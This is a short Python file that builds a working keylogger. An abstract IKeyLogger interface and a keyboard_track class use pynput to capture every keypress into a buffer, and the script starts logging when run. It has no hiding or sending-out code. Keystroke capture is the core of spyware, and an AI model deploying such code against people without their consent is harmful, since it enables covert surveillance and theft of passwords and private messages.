from pynput.keyboard import Key, Listener
from abc import ABC, abstractmethod
from typing import List
import time

class IKeyLogger(ABC):
     @abstractmethod
     def start_logging(self) -> None:
        pass

     @abstractmethod
     def stop_logging(self) -> None:
         pass

     @abstractmethod
     def get_logged_keys(self) -> List[str]:
        pass




class keyboard_track(IKeyLogger):
    def __init__(self):
        self.keys = ''
        self.listener = Listener(on_press=self.on_press)



    def on_press(self,key):
        self.keys += str(key).replace("'", "")

    def start_logging(self) :
        self.listener.start()

    def stop_logging(self):
        self.listener.stop()


    def get_logged_keys(self):
        a = self.keys
        self.keys = ""
        return a


a = keyboard_track()
a.start_logging()


